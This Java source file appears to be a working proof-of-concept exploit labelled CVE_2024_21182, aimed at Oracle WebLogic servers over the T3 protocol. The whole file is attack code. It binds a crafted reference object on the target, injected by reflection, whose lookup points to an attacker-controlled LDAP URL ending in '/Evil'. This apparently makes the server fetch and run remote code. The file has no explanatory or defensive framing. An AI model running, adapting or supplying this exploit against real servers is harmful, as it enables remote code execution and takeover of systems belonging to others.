import weblogic.ejb.container.internal.AggregatableOpaqueReference;
import weblogic.j2ee.descriptor.InjectionTargetBean;
import weblogic.j2ee.descriptor.MessageDestinationRefBean;
import weblogic.jndi.internal.ForeignOpaqueReference;

import javax.naming.Context;
import javax.naming.InitialContext;
import javax.naming.NamingException;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.Hashtable;
import java.util.Map;
import java.util.Random;

public class CVE_2024_21182 {
    static String JNDI_FACTORY="weblogic.jndi.WLInitialContextFactory";

    private static InitialContext getInitialContext(String url)throws NamingException
    {
        Hashtable<String,String> env = new Hashtable<String,String>();
        env.put(Context.INITIAL_CONTEXT_FACTORY, JNDI_FACTORY);
        env.put(Context.PROVIDER_URL, url);
        return new InitialContext(env);
    }
    public static void main(String args[]) throws Exception {
        String t3Url = "192.168.xx.xx:7001";
        String ldapUrl = "ldap://192.168.xx.xx:1389/Evil";
        InitialContext c=getInitialContext("t3://"+t3Url);
        weblogic.application.naming.MessageDestinationReference messageDestinationReference=new weblogic.application.naming.MessageDestinationReference(null, new MessageDestinationRefBean() {
            @Override
            public String[] getDescriptions() {
                return new String[0];
            }

            @Override
            public void addDescription(String s) {

            }

            @Override
            public void removeDescription(String s) {

            }

            @Override
            public void setDescriptions(String[] strings) {

            }

            @Override
            public String getMessageDestinationRefName() {
                return null;
            }

            @Override
            public void setMessageDestinationRefName(String s) {

            }

            @Override
            public String getMessageDestinationType() {
                return "weblogic.application.naming.MessageDestinationReference";
            }

            @Override
            public void setMessageDestinationType(String s) {

            }

            @Override
            public String getMessageDestinationUsage() {
                return null;
            }

            @Override
            public void setMessageDestinationUsage(String s) {

            }

            @Override
            public String getMessageDestinationLink() {
                return null;
            }

            @Override
            public void setMessageDestinationLink(String s) {

            }

            @Override
            public String getMappedName() {
                return null;
            }

            @Override
            public void setMappedName(String s) {

            }

            @Override
            public InjectionTargetBean[] getInjectionTargets() {
                return new InjectionTargetBean[0];
            }

            @Override
            public InjectionTargetBean createInjectionTarget() {
                return null;
            }

            @Override
            public void destroyInjectionTarget(InjectionTargetBean injectionTargetBean) {

            }


            public String getLookupName() {
                return null;
            }


            public void setLookupName(String s) {

            }

            @Override
            public String getId() {
                return null;
            }

            @Override
            public void setId(String s) {

            }
        }, String.format("%s", ldapUrl), null, null);


        AggregatableOpaqueReference f=new AggregatableOpaqueReference("s", "random", "random");
        Field ref = AggregatableOpaqueReference.class.getDeclaredField("referent");
        ref.setAccessible(true);
        ref.set(f,messageDestinationReference);

        String bindName = new Random(System.currentTimeMillis()).nextLong()+"";

        c.bind(bindName,f);
        c.lookup(bindName);

    }
}